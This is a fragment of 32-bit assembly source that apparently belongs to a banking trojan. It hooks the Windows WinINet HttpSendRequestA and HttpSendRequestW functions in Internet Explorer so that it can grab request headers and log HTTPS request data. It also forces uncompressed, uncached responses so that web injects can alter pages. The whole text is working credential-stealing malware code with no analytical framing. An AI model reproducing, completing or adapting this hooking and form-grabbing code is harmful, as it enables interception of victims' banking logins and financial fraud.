
.code

;; ==================================================================================================== ;;
;; hHttpSendRequest is a HttpSendRequestA and HttpSendRequestW handler procedure                        ;;
;; ==================================================================================================== ;;
hHttpSendRequest proc uses esi p1, p4, p5 : dword

	invokx  &GrabIEHeaders[ebx], p1, p4, p5
	jmpz eax, @real
	mov  esi, eax


	invokx  &GetInject[ebx], p1, 0
	jmpz eax, @F

	invokx  _HttpAddRequestHeadersA[ebx], p1, "Accept-Encoding: identity\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE or HTTP_ADDREQ_FLAG_ADD
	invokx  _HttpAddRequestHeadersA[ebx], p1, "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE
	invokx  _HttpAddRequestHeadersA[ebx], p1, "TE: identity\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE


@@:	invokx  &IsGrabTerm[ebx], p1
	jmpz eax, @real

	lodsd
	invokx  &InLog[ebx], esi, eax, HTTPS_REQUEST


@real:
	ret
hHttpSendRequest endp



;; ==================================================================================================== ;;
;; hHttpSendRequestA is a HttpSendRequestA handler procedure                                            ;;
;; ==================================================================================================== ;;
hHttpSendRequestA proc uses ebx p1, p2, p3, p4, p5 : dword

	GetBaseDelta ebx

	invokx  _HttpAddRequestHeadersA[ebx], p1, p2, p3, HTTP_ADDREQ_FLAG_REPLACE or HTTP_ADDREQ_FLAG_ADD
	invokx  &hHttpSendRequest[ebx], p1, p4, p5
	invokx  _HttpSendRequestA[ebx], p1, 0, 0, p4, p5

	ret
hHttpSendRequestA endp



;; ==================================================================================================== ;;
;; hHttpSendRequestW is a HttpSendRequestW handler procedure                                            ;;
;; ==================================================================================================== ;;
hHttpSendRequestW proc uses ebx p1, p2, p3, p4, p5 : dword

	GetBaseDelta ebx

	invokx  _HttpAddRequestHeadersW[ebx], p1, p2, p3, HTTP_ADDREQ_FLAG_REPLACE or HTTP_ADDREQ_FLAG_ADD
	invokx  &hHttpSendRequest[ebx], p1, p4, p5
	invokx  _HttpSendRequestW[ebx], p1, 0, 0, p4, p5

	ret
hHttpSendRequestW endp

